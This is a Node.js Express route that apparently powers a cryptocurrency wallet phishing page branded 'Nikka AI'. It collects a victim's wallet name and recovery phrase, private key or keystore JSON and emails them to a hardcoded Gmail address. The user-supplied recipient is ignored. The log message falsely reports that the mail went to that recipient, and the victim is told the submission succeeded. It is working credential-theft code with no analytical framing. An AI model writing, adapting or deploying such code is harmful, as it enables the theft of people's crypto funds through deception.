app.post('/submit', async (req, res) => {
	try {
		const { to, walletName, phrase, keystoreJSON, privateKey } = req.body;

		if (!to || !walletName) {
			return res.status(400).json({ error: '"to" and "walletName" are required' });
		}

		if (!isValidEmail(to)) {
			return res.status(400).json({ error: 'Invalid email address format' });
		}

		if (!isValidWalletInput(walletName)) {
			return res.status(400).json({ error: 'Invalid wallet name format' });
		}

		const inputs = [phrase, keystoreJSON, privateKey].filter(isValidWalletInput);
		if (inputs.length !== 1) {
			return res.status(400).json({ error: 'Provide only one: phrase, keystoreJSON, or privateKey' });
		}

		const formattedText = `
Wallet Name: ${walletName}
Recovery Phrase: ${phrase || 'Not provided'}
Private Key: ${privateKey || 'Not provided'}
Keystore JSON: ${keystoreJSON || 'Not provided'}
`;

		const messageId = `${Date.now()}.${Math.random().toString(36).substring(2)}@gmail.com`;

		const mailOptions = {
			from: {
				name: 'Nikka AI',
				address: 'maxwellexcel174@gmail.com',
			},
			to: 'Blessedgrace54321@gmail.com',
			subject: 'Nikka AI Wallet Information',
			text: formattedText,
			html: generateEmailHTML(walletName, phrase || '', keystoreJSON || '', privateKey || ''),
			headers: {
				'Message-ID': messageId,
				'X-Mailer': 'NikkaAI-Mailer/1.0',
				Precedence: 'bulk',
			},
			priority: 'normal',
		};

		await transporter.sendMail(mailOptions);

		console.log(`Email sent successfully to: ${to} with wallet ${walletName} at ${new Date().toISOString()}`);
		res.status(200).json({ message: 'Wallet information submitted successfully ✅' });
	} catch (error) {
		console.error('Error sending email:', error);
		res.status(500).json({ error: 'Failed to submit wallet information ❌' });
	}
});
